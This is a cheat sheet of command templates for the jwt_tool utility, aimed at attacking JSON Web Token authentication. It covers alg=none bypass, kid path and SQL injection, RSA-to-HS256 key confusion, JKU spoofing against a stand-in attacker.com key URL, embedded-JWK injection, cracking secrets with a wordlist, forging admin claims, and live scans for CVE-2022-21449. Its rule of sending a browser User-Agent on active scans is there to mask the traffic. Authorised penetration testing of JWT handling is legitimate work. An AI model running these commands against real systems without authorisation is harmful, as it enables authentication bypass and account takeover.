# jwt_tool

> ticarpi's `jwt_tool` — decode, tamper, scan, and crack JWTs from the CLI. Ships on Kali as `jwt_tool` (or `jwt_tool.py` in some distros).

<!-- tags: jwt, jwt_tool, ticarpi, token, auth, web -->

> **UA policy:** every active-test entry (anything hitting a target URL) uses `-rh "User-Agent: {{UA:str:$(q-ua)}}"` so requests carry a real-browser UA. jwt_tool has no dedicated `--user-agent` flag — the `-rh` (raw-header) flag is how you inject it. Alternates: Firefox `Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0`  ·  Safari `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15`.

---

## decode jwt inspect claims
Print header, payload, and signature blocks with base64-decoded JSON. Fastest sanity check on any captured token.

```bash
jwt_tool {{JWT:str}}
```

<!-- meta: risk=low | phase=recon | tags=decode,inspect,claims -->

---

## scan all playbook bypasses passive
Run the full offline playbook — checks alg=none, RSA→HS256 kid injection, JKU/JWK/X5U spoofing, weak-secret hints, expired-token acceptance patterns. No network requests, just template mutations.

```bash
jwt_tool -M pb {{JWT:str}}
```

<!-- meta: risk=low | phase=enum | tags=playbook,scan,bypass,offline -->

---

## scan active test endpoint
Live playbook — actually POSTs each mutated token to a target URL, watches for auth-passed responses. Combine `-rh` for auth header + UA.

```bash
jwt_tool -t {{URL:url:https://target.com/api/protected}} -rh "Authorization: Bearer {{JWT:str}}" -rh "User-Agent: {{UA:str:$(q-ua)}}" -M at
```

<!-- meta: risk=medium | phase=attack | tags=active,scan,bypass,endpoint,url -->

---

## scan through burp caido proxy
Same active scan but routed through your local intercepting proxy — every mutation lands in Burp/Caido history for review.

```bash
jwt_tool -t {{URL:url}} -rh "Authorization: Bearer {{JWT:str}}" -rh "User-Agent: {{UA:str:$(q-ua)}}" -M at -pr {{PROXY:url:http://127.0.0.1:8080}}
```

<!-- meta: risk=medium | phase=attack | tags=proxy,burp,caido,active -->

---

## tamper alg none bypass
Strip the signature and set alg=none — classic broken-verifier bypass. Emits the new token; you then paste it into your session cookie / Auth header.

```bash
jwt_tool {{JWT:str}} -X a
```

<!-- meta: risk=medium | phase=attack | tags=alg-none,tamper,bypass -->

---

## tamper kid path injection
Kid header directory-traversal / SQLi injection. `-X i` iterates known kid payloads (null bytes, path traversal to /dev/null, SQL '1' OR '1', etc.).

```bash
jwt_tool {{JWT:str}} -X i
```

<!-- meta: risk=medium | phase=attack | tags=kid,injection,tamper -->

---

## tamper rsa to hs256 key confusion
RSA-signed token → resign with HS256 using the app's PUBLIC key as the HMAC secret. Requires the target's public key (usually from `/.well-known/jwks.json` or the token issuer's cert).

```bash
jwt_tool {{JWT:str}} -X k -pk {{PUBKEY:file:pubkey.pem}}
```

<!-- meta: risk=high | phase=attack | tags=alg-confusion,rsa,hs256,key-confusion -->

---

## tamper jku spoof self hosted keys
Point the token's jku (JSON Web Key URL) at an attacker-controlled endpoint you host that returns your OWN keypair — target validates against your key instead of its real one.

```bash
jwt_tool {{JWT:str}} -X s -ju {{ATTACKER_JKU_URL:url:https://attacker.com/keys.json}}
```

<!-- meta: risk=high | phase=attack | tags=jku,spoof,self-signed -->

---

## crack hs256 secret wordlist
Offline brute — try each word in the wordlist as the HMAC secret. Fast for weak secrets ("secret", "password", tenant-name, etc.).

```bash
jwt_tool -C -d {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{JWT:str}}
```

<!-- meta: risk=low | phase=attack | tags=crack,brute,hs256,secret -->

---

## sign new token custom claims
Re-sign a token with an HS256 secret you know — swap the payload (e.g. bump admin=true) and get a valid signature. Combine with `-T` to override specific claims interactively.

```bash
jwt_tool {{JWT:str}} -S hs256 -p "{{SECRET:str}}" -T
```

<!-- meta: risk=medium | phase=attack | tags=sign,forge,hs256,claims -->

---

## exploit chain psychic signatures cve-2022-21449
Test for the Java 15-18 CVE where an all-zeros ECDSA signature validates as legitimate. `-X psychic` submits a token with the crafted signature; if it authenticates, target is vulnerable.

```bash
jwt_tool -t {{URL:url}} -rh "Authorization: Bearer {{JWT:str}}" -rh "User-Agent: {{UA:str:$(q-ua)}}" -X psychic
```

<!-- meta: risk=medium | phase=attack | tags=cve-2022-21449,psychic-signature,ecdsa,java -->

---

## check embedded jwk header injection
Some verifiers trust an embedded JWK in the token header itself. jwt_tool `-X j` generates a keypair, embeds the public half in the header, signs with the private half — target auths if it blindly trusts the embedded key.

```bash
jwt_tool {{JWT:str}} -X j
```

<!-- meta: risk=high | phase=attack | tags=jwk,injection,embedded-key,tamper -->
